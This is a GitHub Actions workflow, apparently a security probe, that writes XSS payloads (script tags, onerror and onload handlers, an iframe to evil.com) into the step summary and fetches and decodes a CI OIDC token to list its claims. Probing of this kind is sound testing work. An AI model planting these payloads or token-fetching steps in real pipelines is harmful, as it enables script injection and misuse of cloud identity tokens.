name: Inspector
on:
  workflow_dispatch:
permissions:
  contents: read
  id-token: write
jobs:
  inspect:
    runs-on: ubuntu-latest
    steps:
      - name: Step Summary injection
        run: |
          {
            echo "# XSS Test"
            echo "<script>document.title='XSS-FIRED'</script>"
            echo "<img src=x onerror=alert(1)>"
            echo "<svg onload=alert(2)><circle r=50/></svg>"
            echo "<style>body{background:red}</style>"
            echo "<iframe src=https://evil.com></iframe>"
          } >> "$GITHUB_STEP_SUMMARY"
          echo "Summary written"

      - name: OIDC claims for workflow_dispatch
        run: |
          T=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value')
          echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "
import sys,json
d=json.load(sys.stdin)
for k in ['ref','head_ref','base_ref','event_name','sub','ref_protected','environment']:
  print(k+': '+str(d.get(k,'N/A')))
"
